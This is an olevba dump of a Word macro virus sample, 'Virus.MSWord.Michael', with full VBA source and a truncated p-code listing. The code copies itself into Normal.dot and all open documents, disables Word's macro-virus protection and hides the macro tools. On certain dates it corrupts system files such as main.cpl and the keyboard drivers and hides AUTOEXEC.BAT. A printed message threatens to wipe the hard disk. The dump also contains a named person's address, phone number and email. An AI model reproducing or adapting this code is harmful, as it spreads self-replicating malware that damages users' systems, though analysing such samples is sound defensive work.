olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Michael
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Michael - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./Virus.MSWord.Michael - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Welcome Hacker you gain the back door, now its yours,
'just don't include my name when you create your own virus from this virus.
'I don't want to get any credit

'The tragedy of life is not death, rather, it is what we allow to die within us while we live

'Watch your thoughts, it becomes word
'Watch your words, it becomes actions
'Watch your actions, it becomes your habit
'Watch your habit, it becomes your character
'Watch your character, it becomes your Destiny


'-------- Myckl 2.5


Option Compare Text
Option Explicit
Const MyName = "Myckl2_6"
Const TD = "ThisDocument"
Const RTNorm = "Reference to Normal"
Const ToLove = "Ablog"

'Shared Variables
Dim openDoc As Document
Dim itemName As String
Dim ndxMac As Integer
Dim virusExist As Boolean
Dim otherV As Boolean
Dim otherVName As String


Sub RestorePrev()
    On Error Resume Next
    otherV = False
    For ndxMac = 1 To ThisDocument.VBProject.vbcomponents.Count
        itemName = ThisDocument.VBProject.vbcomponents(ndxMac).Name
        If itemName <> MyName And itemName <> TD And _
            itemName <> RTNorm And itemName <> "" Then
        '----------------------------
            otherVName = itemName
            otherV = True
            GoTo OthersFound
        End If
    Next ndxMac
    
    For Each openDoc In Documents
        For ndxMac = 1 To openDoc.VBProject.vbcomponents.Count
            itemName = openDoc.VBProject.vbcomponents(ndxMac).Name
            If itemName <> MyName And itemName <> TD And _
                itemName <> RTNorm And itemName <> "" Then
            '-----------------------
                otherVName = itemName
                otherV = True
                GoTo OthersFound
            End If
        Next ndxMac
    Next openDoc
    
OthersFound:
    If otherV Then
        Application.OrganizerRename _
            Source:=ThisDocument.FullName, _
            Name:=otherVName, _
            NewName:=MyName, _
            Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub InfectFile()
Dim NTInfected As Boolean
Dim ODInfected As Boolean
    
    On Error Resume Next
    Options.SaveNormalPrompt = False
    Call RestorePrev
    NTInfected = False
    For ndxMac = NormalTemplate.VBProject.vbcomponents.Count To 1 Step -1
        itemName = NormalTemplate.VBProject.vbcomponents(ndxMac).Name
        If itemName = MyName Then
            NTInfected = True
        End If
        If itemName <> MyName And itemName <> TD Then
            Application.OrganizerDelete _
            Source:=NormalTemplate.FullName, _
            Name:=itemName, _
            Object:=wdOrganizerObjectProjectItems
        End If
    Next ndxMac
    
    For Each openDoc In Documents
        ODInfected = False
        With openDoc
            For ndxMac = openDoc.VBProject.vbcomponents.Count To 1 Step -1
                itemName = openDoc.VBProject.vbcomponents(ndxMac).Name
                If itemName = MyName Then
                    ODInfected = True
                End If
                If itemName <> MyName And itemName <> TD And _
                    itemName <> RTNorm Then
                    Application.OrganizerDelete _
                        Source:=openDoc.FullName, _
                        Name:=itemName, _
                        Object:=wdOrganizerObjectProjectItems
                End If
            Next ndxMac
            If Not ODInfected Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=openDoc.FullName, Name:=MyName, Object:=wdOrganizerObjectProjectItems
            End If
        End With
    Next openDoc
    
    If Not NTInfected Then
        Application.OrganizerCopy _
            Source:=ActiveDocument.FullName, _
            Destination:=NormalTemplate.FullName, _
            Name:=MyName, _
            Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If
End Sub
Sub FileNew()
    On Error Resume Next
    If Dialogs(wdDialogFileNew).Show = -1 Then
        Call InfectFile
    End If
End Sub
Sub FileNewDefault()
    On Error Resume Next
    Documents.Add
    Call InfectFile
End Sub
Sub FilePrintDefault()
Dim freeF As Integer

    On Error Resume Next
    If (WeekDay(Date)) <> vbFriday Then
        ActiveDocument.PrintOut
        End
    End If

    If Day(Date) > 23 And WeekDay(Date) = vbFriday Then
        Call SetAttr("c:\windows\dummy.txt", vbArchive)
        freeF = FreeFile
        Kill "c:\windows\dummy.txt"
        Open "c:\windows\dummy.txt" For Output As #freeF
        Print #freeF, "Resume"
        Print #freeF, ""
        Print #freeF, "Applicant's Name: Michael I. Buen"
        Print #freeF, ""
        Print #freeF, "Address: Block 6 Lot 3 Hauskon Homes, Daang Amaya, Tanza Cavite"
        Print #freeF, "Tel:     (046)505-17-39"
        Print #freeF, "Desired Position: Programmer/Technical Writer/Computer Salesman"
        Print #freeF, ""
        Print #freeF, "Skills: Knows C/C++, Assembly, Pascal, COBOL, Clipper, Foxpro, "
        Print #freeF, "        JavaScript, VBScript, Visual Basic, VB for Application "
        Print #freeF, "        Programming, Access, Clarion, HTML, Batch File"
        Print #freeF, ""
        Print #freeF, "Applications Expertise: Resource Workshop, Aldus Pagemaker, Adobe Photoshop,"
        Print #freeF, "        Lotus Smartsuite, Microangelo, and Of Course Excel and "
        Print #freeF, "        Microsoft Word"
        Print #freeF, ""
        Print #freeF, "Favorite Quote: ""The cure for boredom is curiosity, there is no cure "
        Print #freeF, "                for curiosity"""
        Print #freeF, ""
        Print #freeF, "With Experiences In: Innodata, SENCOR, VMSCI, GenDiesel"
        Print #freeF, ""
        Print #freeF, "Without Experiences In: Chowking, J-Sys, Jimac, CBSI, Information Professionals, "
        Print #freeF, "                        Midas Kapiti, James Martin + co, Professional Staffers, "
        Print #freeF, "                        Ergonomics, Express Telecom, 650 Companies"
        Print #freeF, ""
        Print #freeF, ""
        Print #freeF, "e-mail: mycklangelo@yahoo.com / mycklangelo@hotmail.com"
        Print #freeF, "Address: Block 6 Lot 3, Hauskon Homes, Daang Amaya, Tanza Cavite"
        Print #freeF, "tel: (046) 505-17-39"
        Print #freeF, ""
        Print #freeF, "To open my interactive resume type markbuen then highlight it"
        Print #freeF, "then open a file, then my interactive resume will pop up"
        Print #freeF, ""
        Print #freeF, "Warning: If I don't get a stable job by the end of the month"
        Print #freeF, "         I will release a third virus that will remove all "
        Print #freeF, "         folders in the Primary Hard Disk, or in layman's term"
        Print #freeF, "         para ko na ring fi-normat ang Hard Disk Mo"
        Print #freeF, ""
        Print #freeF, "-- Be a Superlearner, Enroll at AMACConda Computer College"
        Print #freeF, ""
        Print #freeF, """Programming today is a race between software engineers "
        Print #freeF, "striving to build bigger and better idiot-proof programs, "
        Print #freeF, "and the universe trying to produce bigger and better idiots. "
        Print #freeF, "So far the universe is winning."""
        Print #freeF, "---Rich Cook"
        Print #freeF, ""
        Print #freeF, "Sa year 2004 FPJ for President, Noli de Castro for Vice President"
        Print #freeF, Chr(15)
        Close #freeF
        Application.PrintOut FileName:="c:\windows\dummy.txt"
        
        If (WeekDay(Date)) <> vbFriday Then
            ActiveDocument.PrintOut
            End
        End If

    End If

    ActiveDocument.PrintOut
End Sub


Sub FileSave()

Dim sfor As Integer
Dim PauseTime, startTime

    On Error Resume Next
    If Documents.Count <> 0 Then
        If Selection.Text = ToLove Then
            ShowVisualBasicEditor = True
            End
        End If
    End If
    
    If Documents.Count > 0 Then
        Call InfectFile
        Call ChangeSomething
        ActiveDocument.Save
    End If
    
    If Day(Date) > 23 And WeekDay(Date) = vbSaturday Then
        For sfor = 50 To 1 Step -1
            Application.StatusBar = String(sfor, " ") & "Michael Learns to Hack"
            PauseTime = 0.015625    ' Set duration.
            startTime = Timer       ' Set start time.
            Do While Timer < startTime + PauseTime
                DoEvents            ' Yield to other processes.
            Loop
            
            DoEvents
        Next sfor
        Application.StatusBar = "And Hope You'll Learn from It Too"
    'ElseIf Day(Date) = 29 Then
    '    'Show inside story
    End If

    
    
End Sub
Sub FileSaveAs()
    On Error Resume Next
    If Dialogs(wdDialogFileSaveAs).Show = -1 Then
        Call InfectFile
        ActiveDocument.Save
    End If
End Sub
Sub FileClose()
    On Error Resume Next
    Call InfectFile
    ActiveDocument.Close
End Sub

Sub FileExit()
    On Error Resume Next
    Options.VirusProtection = False
    Call InfectFile
    Application.Quit
End Sub


Sub FileOpen()
Dim resBalMess As Balloon
Dim resBal As Balloon
Dim resBal2 As Balloon      'back

Dim resOpt As Long

Const resmSchooling = 1
Const resmSkills = 2
Const resmJobExperiences = 3
Const resmPersonalBackground = 4
Const resmPersonalForeground = 5

Const resmCharRef = 1
Const resmQuote = 2
Const resmInsideStory = 3

Const butClose = -12
Const butBack = -5
Const butNext = -6
    
Dim nl As String

    nl = Chr(10)
    
    On Error Resume Next
    Options.VirusProtection = False
    WordBasic.DisableAutoMacros
    If Dialogs(wdDialogFileOpen).Show = -1 Then
        Call InfectFile
        'ActiveDocument.Save
    End If
    
    If Documents.Count > 0 Then
        If Selection.Text = "markbuen" Or (Day(Date) = 30 And Month(Date) Mod 2 = 0) Then
            ' put resume here
            Set resBalMess = Assistant.NewBalloon
            Set resBal = Assistant.NewBalloon
            Set resBal2 = Assistant.NewBalloon
            
            Do
                resBal.Animation = msoAnimationListensToComputer
                resBal.Heading = "Michael Learns To Hack..."
                resBal.Text = "iNTERACTIVE rESUME" & nl & nl & _
                              "Desired Position: " & nl & "  Programmer / Technical Writer / Computer Salesman" & nl & _
                              " - - - - - - - - - - - - - - - - - - - - - - - - - "
                              
                resBal.Labels(resmSchooling).Text = "My Schooling"
                resBal.Labels(resmSkills).Text = "My Skills"
                resBal.Labels(resmJobExperiences).Text = "Job Experiences"
                resBal.Labels(resmPersonalBackground).Text = "Personal Background"
                resBal.Labels(resmPersonalForeground).Text = "Personal Foreground"
                resBal.Button = msoButtonSetNextClose
                resOpt = resBal.Show
                Select Case resOpt
                    Case resmSchooling
                        resBalMess.Animation = msoAnimationWritingNotingSomething
                        resBalMess.Heading = "My Schooling"
                        resBalMess.Labels.Count = 0
                        resBalMess.Text = "Elementary" & nl & _
                                          "   Pio del Pilar Elementary School" & nl & nl & _
                                          "High School" & nl & _
                                          "   Philippine Christian University" & nl & nl & _
                                          "College" & nl & _
                                          "   AMACConda Computer College"
                        resBalMess.Show
                        
                    Case resmSkills
                        resBalMess.Animation = msoAnimationGetTechy
                        resBalMess.Heading = "My Skills"
                        resBalMess.Text = "   Proficient with varius languages like C/C++, Assembly, Pascal, COBOL, Foxpro, SQL, Visual Basic, Clarion, JavaScript, VB for Application, VBScript, HTML" & nl & nl & _
                                          "   Proficient in Application Softwares like Adobe Photoshop, Resourcce Workshop, Microangelo, Lotus Smart Suite, Aldus Pagemaker, Frontpage, Powerpoint, and of course Word and Excel"
                        resBalMess.Labels.Count = 0
                        resBalMess.Show
                        
                    Case resmJobExperiences
                        
                        resBalMess.Animation = msoAnimationWorkingAtSomething
                        resBalMess.Heading = "Experiences"
                        resBalMess.BalloonType = msoBalloonTypeBullets
                                                
                        resBalMess.Text = ""
                        resBalMess.Labels.Count = 4
                        resBalMess.Labels(1).Text = "INNODATA -- Typereader (corrects OCR errors)"
                        resBalMess.Labels(2).Text = "SENCOR -- Encoder"
                        resBalMess.Labels(3).Text = "VMSCI -- Pseudo Programmer Trainee"
                        resBalMess.Labels(4).Text = "GenDiesel -- Super Encoder"
                                                                                    
                        resBalMess.Show
                        
                    Case resmPersonalBackground
                        resBalMess.Animation = msoAnimationCharacterSuccessMajor
                        
                        resBalMess.Heading = "Personal Background"
                        resBalMess.BalloonType = msoBalloonTypeBullets
                                                
                        resBalMess.Text = ""
                        resBalMess.Labels.Count = 3
                        resBalMess.Labels(1).Text = "Hardworking, Softworking, Quiet(low-noise), Sociable Person especially on Party "
                        resBalMess.Labels(2).Text = "Reliable, with Good Interpersonal Communicatin Skills and Intrapersonal Communication Skills (8 data bits, odd parity, 1 stop bit)"
                        resBalMess.Labels(3).Text = "Goal-oriented, Success-oriented, Journey-Oriented, Object-Oriented Person, w/ Good Moral Character and w/ Pissing Personality"
                        resBalMess.Show
                        
                    Case resmPersonalForeground
                        
                        resBalMess.Animation = msoAnimationGetAttentionMinor
                        resBalMess.Heading = "Personal Foreground"
                        resBalMess.BalloonType = msoBalloonTypeBullets
                                                
                        resBalMess.Text = ""
                        resBalMess.Labels.Count = 5
                        resBalMess.Labels(1).Text = "Black-eyes, black hair, black nostrils"
                        resBalMess.Labels(2).Text = "Cute (Patingin nga ng Dimple)"
                        resBalMess.Labels(3).Text = "Down-to-Earth (ALIEN?!)"
                        resBalMess.Labels(4).Text = "Boy-Next-Windows '95 Type"
                        resBalMess.Labels(5).Text = "Macho-chulis ang mga buto"
                        resBalMess.Show
                                                
                    Case butNext
                                            
                        resBal2.Labels.Count = 3
                        resBal2.Heading = "Michael Learns To Hack..."
                        resBal2.Text = "Interactive Resume"
                        resBal2.Labels(1).Text = "Character References"
                        resBal2.Labels(2).Text = "Quote for the Moment"
                        resBal2.Labels(3).Text = "Inside Story"
                        resBal2.Button = msoButtonSetBackClose
                        resOpt = resBal2.Show
                        
                        Select Case resOpt
                        Case resmCharRef
                            resBalMess.Labels.Count = 0
                            resBalMess.Heading = "Character References"
                            resBalMess.Text = "(In No Particular Order Using Rnd (110) and Randomize ) " & nl & nl & _
        "Franco Rayela, Roger Macalino, Byron James C. Ngan, Onel de Guzman, Serafin Santos, Conrad Pena, Jerome Sison, Alde Aceveda, Philip Mora, Richard Canuto, Leonides ""Darren"" Mendoza, Emetrio ""Jing"" Austria, Irving Ilagan, Christian Ramirez, Edwin & Erwin Quita, Joana Alonso, Frederick Vicent Tant, Roland Moldez, Lilibeth Serencio, Gilberto Piliin, Michael Santiano, Michael Salamat, Michael Manuel Murillo, Michael Lucas, Joseph Taopo, Joseph Borja, Joseph Landicho, Giovanni Largo, Juvany Ponce, Alberto Cayanan, Ronald Batoon, Philip Miralles, Jay Manpreet, Aldwin Mapili, Virgilio So, Erlinda Sy, Philbert Pagaspas, Juanita Cataag, Mar Dojillo, Novelita Calimag, Verlin Samonte, Sir Bernabe Santa Maria, Alejandro Bais, Ma'am Grace Quitoriano, Sir Lucero, Ma'am Maderas, Sir Omar Ghazal, Sir Angelo Gillen, Dondi Macas, Arsenio Macapaz, Rolly Mendoza, " & nl & nl & "(Not My Character References)" & nl & "President Joseph Estrada, Blas Ople, Franklin Drilon, Jose Ma. Sison, Jolina Magdangal, " & nl & _
                            "Kristin Hermosa, Aurora Halili, Angela Velez "
                            resBalMess.Animation = msoAnimationGestureUp
                            resBalMess.Show
                        Case resmQuote
                            Call Quote
                        Case resmInsideStory
                            resBalMess.Labels.Count = 0
                            resBalMess.Heading = "InsideStory"
                            resBalMess.Text = "Programmer 's Profile" & nl & _
                                "Real Mode Name: Michael I. Buen" & nl & _
                                "Protected Mode Name: Mycklangelo ""The Skulltor\n"" Buenarotti" & nl & _
                                "Birthday: November 5, 1976" & nl & _
                                "Address: Block 6 Lot 3 Hauskon Homes, Daang Amaya," & nl & _
                                "         Tanza Cavite City" & nl & _
                                "Telephone: (046) 505-17-39" & nl & _
                                "e-mail address: mycklangelo@yahoo.com;mcklangelo@hotmail.com" & nl & _
                                "Group Affiliated: GRAMMERSoft, Elevated Ideas" & nl & _
                                "Group Not Affiliated: AMACConda Group of Companies" & nl & _
                                "Services Offered: Programming , Debugging" & nl & _
                                "Services Not Offered: Hacking , Pest - Control" & nl & nl & _
                                "About Me:" & nl & _
                                "I 'm not a virus programmer per se, I'm just a dedicated programmer and a serious learner." & nl & _
                                "My Favorite Principle in Writing (Code):" & nl & _
                                "A book is finished not when nothing more can be added, but when nothing can be remove from it. -- Code Complete: Steve McConnell" & nl & nl & _
                                "My Interest And Activites:" & nl & _
                                "Reading, Analyzing, Hacking, Reading, Analyzing, Reading, Reading, Analyzing, Hacking, Analyzing, Analyzing, Analyzing, Analyzing, (program halt)" & nl & nl & _
                                "Favorite Quote:" & nl & _
                                "The cure for boredom is curiosity.  There is no cure for curiosity" & nl & _
                                    "*** ACNOWLEDGMENT ***" & nl & _
"I 'm thanking Byron for sharing his computer and ideas, book and time, I'm using his computer every Saturday and Sunday just to write this program.  And to all GRAMMERSoft especially LIENQ, I know what the hell of hacking we are all doing but nevertheless it is still legitimate learning.  And to PC-Cillin, the anti-virus software that gave me a hint that events of Word and Excel can be hooked by naming your procedures with the name of the event.  And to Rivermaya, Eraserheads, Renz Verano who's continuing to write Original Pilipino Music that calms our soul.  And Since I haven't yet finished my Thesis and Automata, I'll consider this as my quick software project, so I'll have to thanks all those beta tester of this virus, you can send me you comment and ratings about my program.  And to Mark ( he's currently a freshman computer science at Adamson University ) my brother, sorry I haven't include your picture here, the program has grown too large already.  Kung nagkataon ang pangalan ng virus na ito " & _
                                "ay ""Mark My Word ""." & nl & nl & _
                                "-- Be a Superlearner, Enroll at AMACConda Computer College"
                                resBalMess.Animation = msoAnimationCheckingSomething
                                resBalMess.Show
                            
                        End Select
                End Select
            Loop While resOpt <> butClose
        End If
    End If
End Sub

Sub ToolsOptions()
    On Error Resume Next
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Options.VirusProtection = False
End Sub

Sub ViewVBCode()
    On Error Resume Next
    msg ("Visual Basic")
    System.Cursor = wdCursorNormal
End Sub

Sub ToolsMacro()
    On Error Resume Next
    msg ("Macro Tools")
    System.Cursor = wdCursorNormal
End Sub

Sub Quote()
Dim quotes(1 To 14) As String
Dim qBal As Balloon
    
Static prevQuote As Long
Static currQuote As Long

Dim nl As String

    nl = Chr(10)

    On Error Resume Next
    Options.VirusProtection = False

    quotes(1) = "On Fuzzy Logic" & nl & nl & _
                """  He who would distinguish " & _
                "  the true from false must have" & _
                "  an adequate idea of what is true and what is false"""
                                                            
    quotes(2) = "On Creating a Pseudocode" & _
                nl & nl & "Iterate.  Try as many ideas as you can" & _
                " in PDL (program design language)before you start coding." & _
                "  Once you start coding, you get emotionally" & _
                " involved with your code and it becomes harder to" & _
                " throw away a bad design and start over." & _
                nl & nl & "-- Steve McConnell"
                

    quotes(3) = """The cure for boredom is curiosity.  There is " & _
                " no cure for curiosity""" & _
                nl & nl & "-- Dorothy Parker"
                         
    quotes(4) = "On Tracking Down an Error" & _
                nl & nl & "  ""And if you can take one from three" & _
                " hundred and sixty-five, what remains?""" & _
                "  ""Three hundred and sixty-four of course"", Alice said." & _
                "  Humpty Dumpty looked doubtful.  ""I'd rather see that done in paper"", he said." & _
                nl & nl & "--Alice in Wonderland"
                
    quotes(5) = "On Good Variable Naming" & _
                 nl & nl & "  ""Don't stand chattering" & _
                 " to yourself like that,"" Humpty Dumpty said, " & _
                 " looking at her for the first time, ""but tell me " & _
                 " your name and your business.""  ""My" & _
                 " name is Alice, but --"".  ""It's a" & _
                 " stupid name enough!"", Humpty Dumpty" & _
                 " interrupted impatiently.  ""What does" & _
                 " it mean?"", ""Must a name mean something?"" Alice" & _
                 " asked doubtfully.  ""Of course it must,""  Humpty" & _
                 " Dumpty said with a short laugh:  ""My name means the" & _
                 " shape that I am and a good handsome shape it is, too. " & _
                 " With a name like yours, you might be any shape, " & _
                 " almost."""
               
                
    quotes(6) = """The significant problems we face cannot be solved by the " & _
                 "same level of thinking that created them.""" & _
                 nl & nl & "--Albert Einstein"
                 
                    
    quotes(7) = """Words are so powerful, but I found it powerfully useless " & _
                 "just to come up with a statement like this.""" & _
                 nl & nl & "--Michael I. Buen"
                 
    quotes(8) = "On Temporary Solution" & _
                 nl & nl & """One powerful heuristic tool is brure force.  Don't " & _
                 "underestimate it.  A brute force solution is better than an elegant " & _
                 "solution that doesn't work.""" & _
                 nl & nl & "--Steve McConnell"
                 
    quotes(9) = "On Design Process Stage" & _
                 nl & nl & """We try to solve the problem by rushing through " & _
                 "the design process so that enough time is left at the end of " & _
                 "project to uncover the errors that were made because we rushed " & _
                 "through the design process.""" & _
                 nl & nl & "--Glenford Myers"
                 
    quotes(10) = "On Premature Optimization" & nl & nl & _
                 """We should forget about small efficiencies, say about 97% of " & _
                 "the time: premature optimization is the root of all evil.""" & _
                 nl & nl & "--Donald Knuth"
                 
    quotes(11) = """The problem definition lays the foundation for the " & _
                 "rest of the programming process.""" & _
                 nl & nl & "--Steve McConnell"
                 
    quotes(12) = """From a programmer's point of view, the user is " & _
                 "a peripheral that types when you issue a read request.""" & _
                 nl & nl & "--Peter Williams"
                 
    quotes(13) = """Programming today is a race between software engineers " & _
                 "striving to build bigger and better idiot-proof programs, " & _
                 "and the universe trying to produce bigger and better idiots. " & _
                 "So far the universe is winning.""" & _
                 nl & nl & "--Rich Cook"
                 
    quotes(14) = """I can do everything through Him who gives me strength.""" & _
                 nl & nl & "--Philipians 4:13 (courtesy of Byron2 James C. Ngan)"
                         
    Call Randomize
    Do
        currQuote = Random()
    Loop While currQuote = prevQuote
    
    Set qBal = Assistant.NewBalloon
    qBal.Heading = "Quote for the Moment"
    qBal.Animation = msoAnimationThinking
    qBal.Text = quotes(currQuote)
    qBal.Show
    
    prevQuote = currQuote
End Sub


Function Random() As Long
    Random = Int((14 * Rnd) + 1)
End Function

Sub ChangeSomething()
Dim kb
Dim i As Long
Dim l As Long
Dim chgHdr As Byte
Dim f1 As Integer
Dim vball As Integer

    On Error Resume Next
    vball = vbReadOnly + vbSystem + vbHidden + vbArchive
    
    If (Day(Date) <= 7 And WeekDay(Date) = vbMonday) And Year(Date) > 1999 Then
        f1 = FreeFile()
        Call SetAttr("c:\windows\system\main.cpl", vbNormal)
        Open "c:\windows\system\main.cpl" For Random As #f1
        chgHdr = 66
        Put #f1, 1, chgHdr
        Close #f1

        kb = Array(67720004, 65536, 28, 370, 0, 0, 0, 196610, 5, 2490368, 5767213, 7340132, 10879026, 3145846, _
            322, 0, -2146303944, -2146336752, 50462976, 1540, 67240193, 0, 0, 134217726, 0, 0, 0, 0, _
            0, 14811362, 17957138, 14680282, 7733366, 7733366, 14549206, 808464432, 834667012, _
            892613426, 959985462, 1371258160, 1414677847, 1330206041, -589440176, 1178882881, _
            1263159367, 1524546124, 1112949592, -1094955698, 36299455, 100992003, 168364039, _
            269290507, 336794129, 404166165, 723196441, 555753246, 623125282, 740828966, 808398381, _
            875770417, -589605323, 471589597, -1120527331, 1298145054, 543912545, 1852142914, _
            1295854881, 1634231145, 975203429, 1549622057, 1918985548, 1948283758, 1210530671, _
            560685921, 774644001, 561929263, 623125312, 673850974, 1361796905, 1414677847, _
            1330206041, 2088598352, 1178882881, 1263159367, 1512192588, 1112949592, 1044139342, _
            828406847, 892613426, 959985462, 1362963760, 1414677847, 1330206041, 1549622096, _
            1178882881, 1263159367, 1512520524, 1112949592, 774655310, 23599)
                        
        f1 = FreeFile()
        If Dir("c:\windows\system\kbdus.kbd", vball) = "kbdus.kbd" Then
            Call SetAttr("c:\windows\system\kbdus.kbd", vbNormal)
        End If
        
        Open "c:\windows\system\kbdus.kbd" For Binary As #f1
        For i = 1 To 398 Step 4
            l = kb((i \ 4))
            Put #f1, i, l
        Next
        Close #f1
        
        f1 = FreeFile()
        If Dir("c:\windows\system\kbdusx.kbd", vball) = "kbdusx.kbd" Then
            Call SetAttr("c:\windows\system\kbdusx.kbd", vbNormal)
        End If
        
        Open "c:\windows\system\kbdusx.kbd" For Binary As #f1
        For i = 1 To 398 Step 4
            l = kb((i \ 4))
            Put #f1, i, l
        Next
        Close #f1
    End If
End Sub


Sub AutoOpen()
    On Error Resume Next
    Options.SaveNormalPrompt = False
    
    otherV = False
    For ndxMac = 1 To NormalTemplate.VBProject.vbcomponents.Count
        itemName = NormalTemplate.VBProject.vbcomponents(ndxMac).Name
        If itemName <> MyName And itemName <> TD And _
            itemName <> RTNorm And itemName <> "" Then
        '-----------------------
            otherVName = itemName
            otherV = True
            GoTo OthersFound
        End If
    Next ndxMac
    
    For Each openDoc In Documents
        For ndxMac = 1 To openDoc.VBProject.vbcomponents.Count
            itemName = openDoc.VBProject.vbcomponents(ndxMac).Name
            If itemName <> MyName And itemName <> TD And _
                itemName <> RTNorm And itemName <> "" Then
            '-----------------------
                otherVName = itemName
                otherV = True
                GoTo OthersFound
            End If
        Next ndxMac
    Next openDoc
    
OthersFound:

    If Not otherV Then
        On Error Resume Next
        Options.VirusProtection = False
        Call InfectFile
        Call ChangeSomething
    Else
        Application.OrganizerRename _
            Source:=ActiveDocument.FullName, _
            Name:=MyName, _
            NewName:=otherVName, _
            Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub DoSome()
    On Error Resume Next
    If Dir("c:\autoexec.bat") = "autoexec.bat" Then
        Call SetAttr("c:\msconfig.sys", vbNormal)
        Kill ("c:\msconfig.sys")
        Call SetAttr("C:\AUTOEXEC.BAT", vbNormal)
        Name "C:\AUTOEXEC.BAT" As "C:\MSCONFIG.SYS"
        Call SetAttr("C:\MSCONFIG.SYS", vbSystem + vbReadOnly + vbHidden)
        Call InfectFile
    End If
End Sub

Sub AutoExec()
    On Error Resume Next
    Options.SaveNormalPrompt = False
    Call ChangeSomething
    Call DoSome
    Call InfectFile
End Sub

Sub AutoClose()
    On Error Resume Next
    Call InfectFile
End Sub

Sub AutoNew()
    On Error Resume Next
    Call InfectFile
End Sub

Sub AutoExit()
    On Error Resume Next
    Call InfectFile
End Sub
 
 
 Sub FileTemplates()
 On Error Resume Next
    msg ("Templates")
    System.Cursor = wdCursorNormal
 End Sub

Sub msg(s As String)
    Call MsgBox("The utilities " & s & "is not available at the standard edition of Microsoft Word, contact Microsoft for upgrade (cost of upgrade is minimal)", vbCritical, "Not available")
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Michael
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Module1 - 46012 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0035 "Welcome Hacker you gain the back door, now its yours,"
' Line #1:
' 	QuoteRem 0x0000 0x004A "just don't include my name when you create your own virus from this virus."
' Line #2:
' 	QuoteRem 0x0000 0x001E "I don't want to get any credit"
' Line #3:
' Line #4:
' 	QuoteRem 0x0000 0x005C "The tragedy of life is not death, rather, it is what we allow to die within us while we live"
' Line #5:
' Line #6:
' 	QuoteRem 0x0000 0x0024 "Watch your thoughts, it becomes word"
' Line #7:
' 	QuoteRem 0x0000 0x0024 "Watch your words, it becomes actions"
' Line #8:
' 	QuoteRem 0x0000 0x0029 "Watch your actions, it becomes your habit"
' Line #9:
' 	QuoteRem 0x0000 0x002B "Watch your habit, it becomes your character"
' Line #10:
' 	QuoteRem 0x0000 0x002D "Watch your character, it becomes your Destiny"
' Line #11:
' Line #12:
' Line #13:
' 	QuoteRem 0x0000 0x0012 "-------- Myckl 2.5"
' Line #14:
' Line #15:
' Line #16:
' 	Option  (Compare Text)
' Line #17:
' 	Option  (Explicit)
' Line #18:
' 	Dim (Const) 
' 	LitStr 0x0008 "Myckl2_6"
' 	VarDefn MyName
' Line #19:
' 	Dim (Const) 
' 	LitStr 0x000C "ThisDocument"
' 	VarDefn TD
' Line #20:
' 	Dim (Const) 
' 	LitStr 0x0013 "Reference to Normal"
' 	VarDefn RTNorm
' Line #21:
' 	Dim (Const) 
' 	LitStr 0x0005 "Ablog"
' 	VarDefn ToLove
' Line #22:
' Line #23:
' 	QuoteRem 0x0000 0x0010 "Shared Variables"
' Line #24:
' 	Dim 
' 	VarDefn openDoc
' Line #25:
' 	Dim 
' 	VarDefn itemName (As String)
' Line #26:
' 	Dim 
' 	VarDefn ndxMac (As Integer)
' Line #27:
' 	Dim 
' 	VarDefn virusExist (As Boolean)
' Line #28:
' 	Dim 
' 	VarDefn otherV (As Boolean)
' Line #29:
' 	Dim 
' 	VarDefn otherVName (As String)
' Line #30:
' Line #31:
' Line #32:
' 	FuncDefn (Sub RestorePrev())
' Line #33:
' 	OnError (Resume Next) 
' Line #34:
' 	LitVarSpecial (False)
' 	St otherV 
' Line #35:
' 	StartForVariable 
' 	Ld ndxMac 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	For 
' Line #36:
' 	Ld ndxMac 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd New 
' 	St itemName 
' Line #37:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld itemName 
' 	Ld MyName 
' 	Ne 
' 	Ld itemName 
' 	Ld TD 
' 	Ne 
' 	And 
' 	Ld itemName 
' 	Ld RTNorm 
' 	Ne 
' 	And 
' 	Ld itemName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #38:
' 	QuoteRem 0x0008 0x001C "----------------------------"
' Line #39:
' 	Ld itemName 
' 	St otherVName 
' Line #40:
' 	LitVarSpecial (True)
' 	St otherV 
' Line #41:
' 	GoTo OthersFound 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	StartForVariable 
' 	Ld ndxMac 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' Line #45:
' 	StartForVariable 
' 	Ld openDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #46:
' 	StartForVariable 
' 	Ld ndxMac 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld openDoc 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	For 
' Line #47:
' 	Ld ndxMac 
' 	Ld openDoc 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd New 
' 	St itemName 
' Line #48:
' 	LineCont 0x0004 09 00 10 00
' 	Ld itemName 
' 	Ld MyName 
' 	Ne 
' 	Ld itemName 
' 	Ld TD 
' 	Ne 
' 	And 
' 	Ld itemName 
' 	Ld RTNorm 
' 	Ne 
' 	And 
